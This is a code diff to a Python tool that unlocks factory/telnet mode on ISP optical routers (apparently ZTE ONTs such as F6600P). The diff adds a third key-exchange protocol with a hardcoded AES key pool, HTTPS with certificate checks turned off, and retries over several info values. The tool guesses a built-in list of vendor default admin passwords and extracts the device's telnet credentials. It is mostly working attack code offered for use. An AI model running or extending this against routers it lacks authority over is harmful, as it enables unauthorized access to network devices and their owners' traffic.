@@ -2,8 +2,12 @@
 # -*- coding: utf-8 -*-
 import requests
 import argparse
+import urllib3
 from random import Random
 from Crypto.Cipher import AES
+
+# Suppress SSL warnings for self-signed certificates (common on ONTs)
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 
 def pad(data_to_pad, block_size):
@@ -47,45 +51,64 @@ class WebFac:
         0x4F, 0x67, 0xEC, 0x97, 0xF4, 0x99
     ]
 
-    def __init__(self, ip, port, user, pw) -> None:
+    # re_rand (protocol v3 — firmware post-late-2024, e.g. F6600P V9.0.10P8N6+)
+    AES_KEY_POOL_RERAND = [
+        0x9C, 0x33, 0x75, 0xD1, 0x1C, 0x42, 0x45, 0x37, 0x18, 0x48,
+        0x91, 0x73, 0x17, 0x45, 0x79, 0x44, 0x43, 0xD7, 0xD5, 0x73,
+        0x33, 0x54, 0x76, 0xD2, 0xC5, 0xF1, 0x2C, 0x4F, 0x7A, 0xBA,
+        0x61, 0xD9, 0x5C, 0x69, 0xDF, 0x8C, 0xD2, 0x1C, 0xDE, 0x3B,
+        0x35, 0x2D, 0x2F, 0xE1, 0xDE, 0x4C, 0x77, 0xF5, 0x1A, 0x65,
+        0xD1, 0xFE, 0x18, 0x43, 0x8E, 0xA7, 0x42, 0x08, 0x04, 0x78,
+        0xD5, 0xE4, 0xF3, 0x34, 0xA4, 0xD3, 0xF2, 0x36, 0x47, 0x6D,
+        0x86, 0x9D, 0x42, 0x65, 0x13, 0x42, 0xDC, 0x42, 0x99, 0x48,
+        0xDC, 0x67, 0x9F, 0x9E, 0xDC, 0x46, 0x37, 0x5F, 0x84, 0x9F,
+        0x6F, 0x76, 0xCE, 0x79, 0x4F, 0x49
+    ]
+
+    def __init__(self, ip, port, user, pw, scheme='http') -> None:
         self.ip = ip
         self.port = port
         self.user = user
         self.pw = pw
+        self.scheme = scheme
         self.S = requests.Session()
+
+    def _url(self, path):
+        return f"{self.scheme}://{self.ip}:{self.port}/{path}"
 
     def reset(self):
         # any wrong step request should reset the facTelnetStep
-        resp = self.S.post(f"http://{self.ip}:{self.port}/webFac", data='SendSq.gch')
+        resp = self.S.post(self._url("webFac"), data='SendSq.gch', verify=False)
         if resp.status_code == 400:
             return True
         return False
 
     def requestFactoryMode(self):
         try:
-            self.S.post(f"http://{self.ip}:{self.port}/webFac", data='RequestFactoryMode.gch')
+            self.S.post(self._url("webFac"), data='RequestFactoryMode.gch', verify=False)
         except requests.exceptions.ConnectionError:
             # this is normal
             pass
         except Exception as e:
             print(e)
 
-    def sendSq(self):
+    def sendSq(self, debug=False):
         try:
             # rand takes from time seconds, range 0-59
             rand = Random().randint(0, 59)
 
             # the byte after last digital can not be null
-            resp = self.S.post(f"http://{self.ip}:{self.port}/webFac", data=f'SendSq.gch?rand={rand}\r\n')
+            resp = self.S.post(self._url("webFac"), data=f'SendSq.gch?rand={rand}\r\n', verify=False)
             if resp.status_code != 200:
                 return False
-            # print(repr(resp.text))
+            if debug:
+                print(f"  [DEBUG] sendSq rand={rand} status={resp.status_code} body={repr(resp.text)}")
 
             if len(resp.content) == 0:
                 index = rand
                 key_pool = WebFacTelnet.AES_KEY_POOL
                 version = 1
-            # new protocol
+            # new protocol (v2)
             elif "newrand" in resp.text:
                 newrand = int(resp.text[len("newrand="):])
                 #           v62 = (0x1000193 * rand) & 0x3F;
@@ -95,9 +118,24 @@ class WebFac:
                 index = ((0x1000193 * rand) & 0x3F ^ newrand) % 60
                 key_pool = WebFacTelnet.AES_KEY_POOL_NEW
                 version = 2
+            # re_rand protocol (v3) — firmware post-late-2024, e.g. F6600P V9.0.10P8N6+
+            # response format: "re_rand={server_rand}&{rand_seed}&{mac_data}"
+            elif "re_rand" in resp.text:
+                parts = resp.text[len("re_rand="):].split("&")
+                server_rand = int(parts[0])
+                if debug:
+                    print(f"  [DEBUG] re_rand parts={parts} server_rand={server_rand} client_rand={rand}")
+                # index = (client_rand XOR server_rand) % 60
+                index = (rand ^ server_rand) % 60
+                key_pool = WebFacTelnet.AES_KEY_POOL_RERAND
+                version = 3
             else:
+                print(f"  [DEBUG] unknown protocol response: {repr(resp.text)}")
                 print("protocol error")
                 return False
+
+            if debug:
+                print(f"  [DEBUG] protocol v{version} index={index}")
 
             key = map(lambda x: (x ^ 0xA5) & 0xFF, key_pool[index:index+24])
             key = bytes(key)
@@ -110,29 +148,41 @@ class WebFac:
             print(e)
         return False
 
-    def sendInfo(self):
-        try:
-            resp = self.S.post(f"http://{self.ip}:{self.port}/webFacEntry",
-                               data=self.chiper.encrypt(pad(f'SendInfo.gch?info=6|'.encode(), 16)))
-            # print(resp.status_code, repr(resp.text))
-            if resp.status_code == 200:
-                return True
-            elif resp.status_code == 400:
-                print("protocol error")
-            elif resp.status_code == 401:
-                print("info error")
-        except Exception as e:
-            print(e)
+    def sendInfo(self, debug=False):
+        # Try multiple info values accepted by different firmware versions
+        # info bits: 1=telnet, 2=serial, 4=? — try 6 (telnet+serial), 1 (telnet only), 7
+        for info_val in [6, 1, 7, 2, 4, 3]:
+            for suffix in ['|', '']:
+                payload = f'SendInfo.gch?info={info_val}{suffix}'.encode()
+                try:
+                    resp = self.S.post(self._url("webFacEntry"),
+                                       data=self.chiper.encrypt(pad(payload, 16)),
+                                       verify=False)
+                    if debug:
+                        print(f"  [DEBUG] sendInfo payload={repr(payload.decode())} status={resp.status_code}")
+                    if resp.status_code == 200:
+                        if debug:
+                            print(f"  [DEBUG] sendInfo OK with info={info_val} suffix='{suffix}'")
+                        return True
+                    elif resp.status_code == 400:
+                        print("protocol error")
+                        return False
+                    # 401 = info error, try next value
+                except Exception as e:
+                    print(e)
+                    return False
+        print("info error (all values tried)")
         return False
 
     def checkLoginAuth(self):
         try:
             resp = self.S.post(
-                f"http://{self.ip}:{self.port}/webFacEntry",
+                self._url("webFacEntry"),
                 data=self.chiper.encrypt(
                     # httpd will alloc 1 more byte to ensure null terminated, anyway we add one more null to ensure
                     pad(f'CheckLoginAuth.gch?version50&user={self.user}&pass={self.pw}'.encode(), 16)
-                ))
+                ),
+                verify=False)
             # print(repr(resp.text))
             if resp.status_code == 200:
                 # checkLoginAuth use wrong function strlen to calc response size, so we may need to pad ciphertext first
@@ -156,16 +206,17 @@ class WebFac:
 
 
 class WebFacSerial(WebFac):
-    def __init__(self, ip, port, user, pw) -> None:
-        super().__init__(ip, port, user, pw)
+    def __init__(self, ip, port, user, pw, scheme='http') -> None:
+        super().__init__(ip, port, user, pw, scheme)
 
     def serialSlience(self, action):
         try:
             resp = self.S.post(
-                f"http://{self.ip}:{self.port}/webFacEntry",
+                self._url("webFacEntry"),
                 data=self.chiper.encrypt(
                     pad(f'SerialSlience.gch?action={action}'.encode(), 16)
-                ))
+                ),
+                verify=False)
             # print(repr(resp.text))
             if resp.status_code == 200:
                 return True
@@ -177,24 +228,26 @@ class WebFacSerial(WebFac):
 
 
 class WebFacTelnet(WebFac):
-    def __init__(self, ip, port, user, pw) -> None:
-        super().__init__(ip, port, user, pw)
+    def __init__(self, ip, port, user, pw, scheme='http') -> None:
+        super().__init__(ip, port, user, pw, scheme)
 
     def factoryMode(self, action):
         try:
             if action == 'close':
                 resp = self.S.post(
-                    f"http://{self.ip}:{self.port}/webFacEntry",
+                    self._url("webFacEntry"),
                     data=self.chiper.encrypt(
                         pad(f'FactoryMode.gch?{action}'.encode(), 16)
-                    ))
+                    ),
+                    verify=False)
             else:
                 # mode 1:ops 2:dev 3:production 4:user
                 resp = self.S.post(
-                    f"http://{self.ip}:{self.port}/webFacEntry",
+                    self._url("webFacEntry"),
                     data=self.chiper.encrypt(
                         pad('FactoryMode.gch?mode=2&user=notused'.encode(), 16)
-                    ))
+                    ),
+                    verify=False)
             # print(repr(resp.text))
             if resp.status_code == 200:
                 # resp should be "FactoryModeAuth.gch?user=<telnetuser>&pass=<telnetpass>"
@@ -212,11 +265,11 @@ class WebFacTelnet(WebFac):
         return False
 
 
-def dealFacAuth(Class: WebFac, ip, port, users, pws):
+def dealFacAuth(Class: WebFac, ip, port, users, pws, scheme='http', debug=False):
     for user in users:
         for pw in pws:
             print(f"trying  user:\"{user}\" pass:\"{pw}\" ")
-            webfac: WebFac = Class(ip, port, user, pw)
+            webfac: WebFac = Class(ip, port, user, pw, scheme)
             print("reset facTelnetSteps:")
             if webfac.reset():
                 print("reset OK!\n")
@@ -226,8 +279,11 @@ def dealFacAuth(Class: WebFac, ip, port, users, pws):
             print("OK!\n")
 
             print("facStep 2:")
-            version = webfac.sendSq()
-            print("OK!\n")
+            version = webfac.sendSq(debug=debug)
+            if not version:
+                print("sendSq failed, try next...\n")
+                continue
+            print(f"OK! (protocol v{version})\n")
 
             if version == 1:
                 print("facStep 3:")
@@ -236,14 +292,15 @@ def dealFacAuth(Class: WebFac, ip, port, users, pws):
                     print("facStep 4:")
                     print("OK!\n")
                     return webfac
-            elif version == 2:
-                print("facStep 3:")
-                if not webfac.sendInfo():
-                    print("sendInfo error")
-                    return
+            elif version in (2, 3):
+                label = "re_rand/v3" if version == 3 else "v2"
+                print(f"facStep 3 ({label}):")
+                if not webfac.sendInfo(debug=debug):
+                    print("sendInfo error — all info values failed\n")
+                    return  # sendInfo failure is protocol-level, not credential-level
                 print("OK!\n")
 
-                print("facStep 4:")
+                print(f"facStep 4 ({label}):")
                 url = webfac.checkLoginAuth()
                 if not url:
                     print("try next...\n")
@@ -254,8 +311,8 @@ def dealFacAuth(Class: WebFac, ip, port, users, pws):
     return False
 
 
-def dealSerial(ip, port, users, pws, action):
-    serial = dealFacAuth(WebFacSerial, ip, port, users, pws)
+def dealSerial(ip, port, users, pws, action, scheme='http', debug=False):
+    serial = dealFacAuth(WebFacSerial, ip, port, users, pws, scheme, debug)
     if not serial:
         return
 
@@ -266,8 +323,8 @@ def dealSerial(ip, port, users, pws, action):
     return
 
 
-def dealTelnet(ip, port, users, pws, action):
-    telnet = dealFacAuth(WebFacTelnet, ip, port, users, pws)
+def dealTelnet(ip, port, users, pws, action, scheme='http', debug=False):
+    telnet = dealFacAuth(WebFacTelnet, ip, port, users, pws, scheme, debug)
     if not telnet:
         print('No Luck!')
         return
@@ -292,7 +349,9 @@ def parseArgs():
                         'nE%jA@5b', "aDm8H%MdA", "CUAdmin", "nE7jA%5m", "cqunicom",
                         "1620@CTCC", "1620@CUcc", "admintelecom", "cuadmin", "lnadmin"])
     parser.add_argument('--ip', help='route ip', default="192.168.1.1")
-    parser.add_argument('--port', help='router http port', type=int, default=80)
+    parser.add_argument('--port', help='router http/https port', type=int, default=80)
+    parser.add_argument('--https', action='store_true', help='use HTTPS instead of HTTP (e.g. for port 443)')
+    parser.add_argument('--debug', action='store_true', help='print raw protocol responses for troubleshooting')
     subparsers = parser.add_subparsers(dest='cmd', title='subcommands',
                                        description='valid subcommands',
                                        help='supported commands')
@@ -307,11 +366,12 @@ def parseArgs():
 
 def main():
     args = parseArgs()
-    # print(args)
+    scheme = 'https' if args.https else 'http'
+    debug = args.debug
     if args.cmd == 'serial':
-        dealSerial(args.ip, args.port, args.user, args.pw, args.action)
+        dealSerial(args.ip, args.port, args.user, args.pw, args.action, scheme, debug)
     elif args.cmd == 'telnet':
-        dealTelnet(args.ip, args.port, args.user, args.pw, args.action)
+        dealTelnet(args.ip, args.port, args.user, args.pw, args.action, scheme, debug)
 
 
 if __name__ == '__main__':
